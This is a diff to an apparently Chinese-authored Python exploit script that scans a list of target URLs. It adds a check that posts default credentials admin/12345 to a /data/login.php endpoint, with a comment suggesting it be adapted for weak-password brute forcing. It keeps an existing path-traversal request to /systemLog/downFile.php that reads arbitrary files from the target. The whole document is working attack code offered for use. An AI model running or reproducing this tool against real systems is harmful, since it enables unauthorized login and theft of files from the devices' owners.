@@ -16,10 +16,33 @@ def title():
         print("+--------        Author: Henry4E36         -------+")
         print("+-------------------------------------------------+")
 
+def login_url(url):
+    login_url = url + "/data/login.php"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
+        "Content-Type": "application/x-www-form-urlencoded"
+
+    }
+    # 这里大家可以修改下进行弱口令爆破，base64编码。
+    data = "userName=YWRtaW4=&password=MTIzNDU="
+    try:
+        res_login = requests.post(url=login_url, data=data, headers=headers,verify=False, timeout=5)
+        if "0" in res_login.text and res_login.status_code == 200:
+            print("[----------------------------------------------]")
+            print(f"\033[31m[!] 目标系统: {url} 存在通用弱口令admin/12345\033[0m ")
+        else:
+            print("[----------------------------------------------]")
+            print(f"[!] [31m目标系统: {url} 不存在弱口令 ")
+    except Exception as e:
+        print("[----------------------------------------------]")
+        print("[0]  目标系统出现意外情况！\n", e)
+
 def target_url(url,filename):
     target_url = url + f"/systemLog/downFile.php?fileName=../../../../../../../{filename}"
     headers = {
-        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36"
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
+        "Content-Type" : "application/x-www-form-urlencoded"
+
     }
 
     try:
@@ -51,6 +74,7 @@ if __name__ == "__main__":
             if url[:4] != "http":
                 url = "http://" +url
             url = url.strip()
+            login_url(url)
             target_url(url,filename)
     urls.close()
 
